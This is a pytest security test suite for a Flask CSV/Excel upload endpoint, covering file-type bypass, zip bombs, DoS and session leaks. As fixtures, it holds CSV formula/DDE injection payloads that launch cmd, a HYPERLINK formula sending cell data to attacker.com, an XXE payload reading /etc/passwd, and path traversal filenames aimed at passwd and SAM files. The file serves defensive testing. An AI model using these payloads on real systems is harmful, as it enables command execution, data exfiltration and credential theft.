#!/usr/bin/env python3
"""
Comprehensive Security Testing for Flask CSV Upload Endpoint
Tests for file upload vulnerabilities, CSV injection, executable masquerading,
and other security issues based on 2025 Flask security best practices.
"""
import pytest
import os
import io
import tempfile
import zipfile
from werkzeug.datastructures import FileStorage
from unittest.mock import patch, MagicMock
import pandas as pd

# Import the Flask app
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
from app import app, allowed_file


class TestFileUploadSecurity:
    """Test suite for file upload security vulnerabilities"""
    
    @pytest.fixture
    def client(self):
        """Create test client with security configurations"""
        app.config['TESTING'] = True
        app.config['WTF_CSRF_ENABLED'] = False
        app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB
        return app.test_client()
    
    @pytest.fixture
    def valid_csv_content(self):
        """Create valid CSV content for testing"""
        return "First Name,Last Name,Company Name,Title,Industry\nJohn,Doe,Acme Corp,CEO,Technology\nJane,Smith,Tech Inc,CTO,Software"
    
    @pytest.fixture
    def malicious_csv_injection_payloads(self):
        """CSV injection payloads based on 2025 OWASP guidelines"""
        return [
            # Formula injection attacks
            "=1+1+cmd|'/c calc'!A0,Test,Company,Title,Industry",
            "+2+3+cmd|'/c notepad'!A0,Test,Company,Title,Industry",
            "-2-3-cmd|'/c whoami'!A0,Test,Company,Title,Industry", 
            "@SUM(1+1)*cmd|'/c dir'!A0,Test,Company,Title,Industry",
            # Data exfiltration attempts
            "=HYPERLINK(\"http://attacker.com/\"&A1),Test,Company,Title,Industry",
            # DDE (Dynamic Data Exchange) attacks
            "=cmd|'/c calc'!A0,Test,Company,Title,Industry",
            # Macro execution attempts
            "=EXEC(\"calc.exe\"),Test,Company,Title,Industry"
        ]

    def test_file_extension_validation(self, client):
        """Test file extension filtering and validation"""
        # Test allowed extensions
        allowed_extensions = ['test.csv', 'test.xlsx', 'test.xls']
        for filename in allowed_extensions:
            assert allowed_file(filename), f"Should allow {filename}"
        
        # Test blocked extensions
        blocked_extensions = [
            'test.exe', 'test.bat', 'test.cmd', 'test.scr', 
            'test.pif', 'test.com', 'test.js', 'test.vbs',
            'test.jar', 'test.zip', 'test.rar'
        ]
        for filename in blocked_extensions:
            assert not allowed_file(filename), f"Should block {filename}"
    
    def test_file_extension_bypass_attempts(self, client, valid_csv_content):
        """Test various file extension bypass techniques"""
        bypass_attempts = [
            # Double extension attacks
            ('malicious.exe.csv', valid_csv_content),
            ('shell.php.csv', valid_csv_content),
            ('virus.bat.csv', valid_csv_content),
            # Null byte injection
            ('normal.csv\x00.exe', valid_csv_content),
            # Case variation attacks
            ('test.CSV', valid_csv_content),
            ('test.XlSx', valid_csv_content),
            # Unicode homograph attacks
            ('test.сѕv', valid_csv_content),  # Cyrillic characters
        ]
        
        for filename, content in bypass_attempts:
            data = {
                'file': (io.BytesIO(content.encode()), filename)
            }
            response = client.post('/upload', data=data)
            
            # Should either reject or handle safely
            if filename.endswith(('.csv', '.xlsx', '.xls')):
                # Valid extensions should be processed
                assert response.status_code in [200, 302], f"Valid file {filename} should be accepted"
            else:
                # Invalid extensions should be rejected
                assert response.status_code == 302, f"Invalid file {filename} should be rejected"

    def test_csv_injection_prevention(self, client, malicious_csv_injection_payloads):
        """Test CSV formula injection attack prevention"""
        for payload in malicious_csv_injection_payloads:
            # Create CSV with malicious payload
            csv_content = f"First Name,Last Name,Company Name,Title,Industry\n{payload}"
            
            data = {
                'file': (io.BytesIO(csv_content.encode()), 'malicious.csv')
            }
            
            response = client.post('/upload', data=data)
            
            # Should handle malicious content gracefully
            assert response.status_code in [200, 302], "Should not crash on malicious CSV"
            
            # Check that response doesn't contain formula execution indicators  
            response_data = response.get_data(as_text=True)
            dangerous_indicators = ['calc', 'cmd', 'exec', 'system', 'shell']
            for indicator in dangerous_indicators:
                assert indicator.lower() not in response_data.lower(), f"Response should not contain {indicator}"

    def test_executable_file_masquerading(self, client):
        """Test detection of executable files masquerading as CSV"""
        # Windows PE header for executable files
        pe_header = b'\x4d\x5a\x90\x00'  # "MZ" + padding
        exe_content = pe_header + b'This is a Windows executable disguised as CSV' + b'\x00' * 1000
        
        # ELF header for Linux executables  
        elf_header = b'\x7f\x45\x4c\x46'  # "\x7fELF"
        elf_content = elf_header + b'This is a Linux executable disguised as CSV' + b'\x00' * 1000
        
        masquerading_files = [
            ('fake_csv.csv', exe_content),
            ('trojan.csv', elf_content),
            ('virus.xlsx', exe_content),
        ]
        
        for filename, content in masquerading_files:
            data = {
                'file': (io.BytesIO(content), filename)
            }
            
            response = client.post('/upload', data=data)
            
            # Should detect and reject executable files
            assert response.status_code == 302, f"Should reject executable file {filename}"
            
            # Check for appropriate error message
            response_data = response.get_data(as_text=True)
            assert any(msg in response_data.lower() for msg in ['error', 'invalid', 'file']), \
                   "Should show error message for executable files"

    def test_file_size_limits(self, client):
        """Test file size limit validation and bypass attempts"""
        # Test file exactly at limit (should be accepted)
        max_size = 16 * 1024 * 1024  # 16MB
        large_content = 'A' * (max_size - 100)  # Slightly under limit
        valid_csv = f"Name,Company\n{large_content},Test Corp"
        
        data = {
            'file': (io.BytesIO(valid_csv.encode()), 'large_valid.csv')
        }
        response = client.post('/upload', data=data)
        assert response.status_code in [200, 302, 413], "Large valid file should be handled"
        
        # Test file over limit (should be rejected)
        oversized_content = 'B' * (max_size + 1000)  # Over limit
        oversized_csv = f"Name,Company\n{oversized_content},Test Corp"
        
        data = {
            'file': (io.BytesIO(oversized_csv.encode()), 'oversized.csv')
        }
        response = client.post('/upload', data=data)
        assert response.status_code == 413, "Oversized file should be rejected with 413"

    def test_zip_bomb_protection(self, client):
        """Test protection against zip bomb attacks in Excel files"""
        # Create a mock zip bomb (compressed Excel file)
        zip_bomb_content = io.BytesIO()
        
        with zipfile.ZipFile(zip_bomb_content, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Create a large uncompressed content that compresses well
            large_data = '0' * (10 * 1024 * 1024)  # 10MB of zeros
            zf.writestr('xl/worksheets/sheet1.xml', large_data)
            
        zip_bomb_content.seek(0)
        
        data = {
            'file': (zip_bomb_content, 'zipbomb.xlsx')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle gracefully without consuming excessive memory
        assert response.status_code in [200, 302, 413, 400], "Should handle zip bomb safely"

    def test_path_traversal_protection(self, client, valid_csv_content):
        """Test protection against path traversal attacks"""
        path_traversal_filenames = [
            '../../../etc/passwd.csv',
            '..\\..\\windows\\system32\\config\\sam.csv', 
            '/etc/passwd.csv',
            'C:\\Windows\\System32\\config\\SAM.csv',
            '....//....//etc//passwd.csv',
            'test/../../etc/passwd.csv'
        ]
        
        for filename in path_traversal_filenames:
            data = {
                'file': (io.BytesIO(valid_csv_content.encode()), filename)
            }
            
            response = client.post('/upload', data=data)
            
            # Should sanitize filename and process safely
            assert response.status_code in [200, 302], f"Should handle path traversal in {filename}"
            
            # Verify no actual path traversal occurred (check logs/session data)
            with client.session_transaction() as sess:
                if 'filename' in sess:
                    stored_filename = sess['filename']
                    assert '../' not in stored_filename, "Stored filename should not contain path traversal"
                    assert '\\' not in stored_filename or stored_filename.count('\\') <= 1, "Should sanitize backslashes"

    def test_malformed_file_handling(self, client):
        """Test handling of malformed CSV and Excel files"""
        malformed_files = [
            # Truncated CSV
            ('truncated.csv', b'Name,Company\nJohn,'),
            # Invalid CSV with unescaped quotes  
            ('invalid_quotes.csv', b'Name,Company\n"John"Doe","Acme"Corp"'),
            # Binary garbage with CSV extension
            ('garbage.csv', b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09'),
            # Empty file
            ('empty.csv', b''),
            # Only headers
            ('headers_only.csv', b'Name,Company,Title'),
            # Corrupted Excel file  
            ('corrupted.xlsx', b'PK\x03\x04corrupt_excel_data'),
        ]
        
        for filename, content in malformed_files:
            data = {
                'file': (io.BytesIO(content), filename)
            }
            
            response = client.post('/upload', data=data)
            
            # Should handle malformed files gracefully without crashing
            assert response.status_code in [200, 302, 400], f"Should handle malformed file {filename}"
            
            # Check for appropriate error handling
            response_data = response.get_data(as_text=True)
            if response.status_code == 302:
                # Should show error message for invalid files
                error_indicators = ['error', 'invalid', 'unable', 'failed']
                has_error = any(indicator in response_data.lower() for indicator in error_indicators)
                assert has_error, f"Should show error message for malformed file {filename}"

    def test_unicode_filename_handling(self, client, valid_csv_content):
        """Test handling of Unicode filenames and content"""
        unicode_test_cases = [
            # Various Unicode characters
            ('测试文件.csv', valid_csv_content),
            ('файл.csv', valid_csv_content),  # Cyrillic
            ('アップロード.csv', valid_csv_content),  # Japanese
            ('🎯💼📊.csv', valid_csv_content),  # Emojis
            ('café_résumé.csv', valid_csv_content),  # Accented characters
        ]
        
        for filename, content in unicode_test_cases:
            data = {
                'file': (io.BytesIO(content.encode('utf-8')), filename)
            }
            
            response = client.post('/upload', data=data)
            
            # Should handle Unicode filenames gracefully
            assert response.status_code in [200, 302], f"Should handle Unicode filename {filename}"

    def test_content_type_validation(self, client):
        """Test MIME type validation and spoofing attempts"""
        # Test correct content types
        valid_cases = [
            ('test.csv', 'text/csv', b'Name,Company\nJohn,Acme'),
            ('test.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', b'PK\x03\x04'),
        ]
        
        for filename, content_type, content in valid_cases:
            data = {
                'file': FileStorage(
                    stream=io.BytesIO(content),
                    filename=filename,
                    content_type=content_type
                )
            }
            
            response = client.post('/upload', data=data, content_type='multipart/form-data')
            # Should accept valid content types
            assert response.status_code in [200, 302, 400], f"Should handle valid content type for {filename}"

    def test_concurrent_upload_safety(self, client, valid_csv_content):
        """Test concurrent upload handling and race condition prevention"""
        import threading
        import time
        
        results = []
        
        def upload_file(thread_id):
            """Upload file in separate thread"""
            try:
                data = {
                    'file': (io.BytesIO(valid_csv_content.encode()), f'concurrent_{thread_id}.csv')
                }
                response = client.post('/upload', data=data)
                results.append((thread_id, response.status_code))
            except Exception as e:
                results.append((thread_id, f"Error: {str(e)}"))
        
        # Start multiple concurrent uploads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=upload_file, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=10)
        
        # Verify all uploads were handled safely
        assert len(results) == 5, "All concurrent uploads should complete"
        for thread_id, status in results:
            if isinstance(status, int):
                assert status in [200, 302, 400, 413], f"Thread {thread_id} should return valid HTTP status"
            else:
                # If error occurred, it should be handled gracefully
                assert "Error:" in str(status), f"Thread {thread_id} error should be captured"

    def test_session_security(self, client, valid_csv_content):
        """Test session handling security"""
        # Test session data isolation
        data = {
            'file': (io.BytesIO(valid_csv_content.encode()), 'session_test.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Check session data doesn't leak sensitive information
        with client.session_transaction() as sess:
            # Should not store raw file content in session
            assert 'raw_file_content' not in sess, "Should not store raw file content in session"
            
            # Should not store sensitive application data
            sensitive_keys = ['secret_key', 'api_key', 'password', 'token']
            for key in sensitive_keys:
                assert key not in sess, f"Session should not contain {key}"
            
            # File data should be properly encoded if stored
            if 'file_data' in sess:
                file_data = sess['file_data']
                assert isinstance(file_data, str), "File data should be string (base64 encoded)"
                # Should be base64 encoded
                import base64
                try:
                    decoded = base64.b64decode(file_data)
                    assert len(decoded) > 0, "File data should decode successfully"
                except Exception:
                    pytest.fail("File data should be valid base64")

    def test_error_message_security(self, client):
        """Test that error messages don't leak sensitive information"""
        # Test various error conditions
        error_test_cases = [
            # No file uploaded
            ({}, "No file uploaded"),
            # Invalid file type
            ({'file': (io.BytesIO(b'test'), 'test.exe')}, "Invalid file type"),
            # Oversized file
            ({'file': (io.BytesIO(b'x' * (17 * 1024 * 1024)), 'large.csv')}, "File too large"),
        ]
        
        for data, description in error_test_cases:
            response = client.post('/upload', data=data)
            response_text = response.get_data(as_text=True)
            
            # Check that error messages don't reveal system information
            sensitive_info = [
                '/home/', '/usr/', '/var/', 'C:\\',
                'python', 'flask', 'werkzeug',
                'traceback', 'exception', 'stack trace',
                os.path.abspath('.'), __file__
            ]
            
            for info in sensitive_info:
                assert str(info).lower() not in response_text.lower(), \
                       f"Error message should not reveal {info} for {description}"

    @patch('app.pd.read_csv')
    @patch('app.pd.read_excel')
    def test_pandas_security_hardening(self, mock_excel, mock_csv, client):
        """Test pandas reading security and error handling"""
        # Test CSV parsing with malicious content
        mock_csv.side_effect = Exception("Simulated pandas error")
        
        data = {
            'file': (io.BytesIO(b'Name,Company\nTest,Corp'), 'test.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle pandas errors gracefully
        assert response.status_code == 302, "Should redirect on pandas error"
        
        # Test Excel parsing with potential XXE or similar attacks
        mock_excel.side_effect = Exception("Simulated Excel parsing error")
        
        data = {
            'file': (io.BytesIO(b'PK\x03\x04fake_excel'), 'test.xlsx')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle Excel parsing errors gracefully
        assert response.status_code == 302, "Should redirect on Excel parsing error"


class TestAdvancedSecurityScenarios:
    """Advanced security test scenarios"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        app.config['TESTING'] = True
        return app.test_client()

    def test_polyglot_file_detection(self, client):
        """Test detection of polyglot files (valid CSV + executable)"""
        # Create a file that's both valid CSV and contains executable code
        polyglot_content = (
            b'#!/bin/bash\n'
            b'# This is both a CSV and executable script\n'
            b'echo "Malicious payload executed"\n'
            b'Name,Company,Title\n'
            b'John,Acme,CEO\n'
            b'Jane,Tech,CTO\n'
        )
        
        data = {
            'file': (io.BytesIO(polyglot_content), 'polyglot.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Should process as CSV, ignoring executable parts
        assert response.status_code in [200, 302], "Should handle polyglot file safely"

    def test_xml_external_entity_prevention(self, client):
        """Test XXE prevention in Excel files"""
        # Excel files are XML-based, test XXE attack prevention
        xxe_payload = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <worksheet>
    <sheetData>
      <row><c><v>&xxe;</v></c></row>
    </sheetData>
  </worksheet>
</workbook>'''
        
        data = {
            'file': (io.BytesIO(xxe_payload), 'xxe_attack.xlsx')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle XXE attempts safely (pandas should prevent XXE by default)
        assert response.status_code in [200, 302, 400], "Should handle XXE attempts safely"

    def test_memory_exhaustion_protection(self, client):
        """Test protection against memory exhaustion attacks"""
        # Create CSV with extremely wide rows
        wide_csv = "Name," + ",".join([f"Col{i}" for i in range(10000)]) + "\n"
        wide_csv += "John," + ",".join(["Data"] * 10000) + "\n"
        
        data = {
            'file': (io.BytesIO(wide_csv.encode()), 'wide.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle wide CSV without memory exhaustion
        assert response.status_code in [200, 302, 400, 413], "Should handle wide CSV safely"

    def test_denial_of_service_protection(self, client):
        """Test DoS protection mechanisms"""
        # Test rapid successive uploads
        for i in range(10):
            data = {
                'file': (io.BytesIO(b'Name,Company\nTest,Corp'), f'dos_test_{i}.csv')
            }
            response = client.post('/upload', data=data)
            
            # Should handle rapid uploads without crashing
            assert response.status_code in [200, 302, 400, 413, 429], \
                   f"Should handle rapid upload {i} safely"

if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])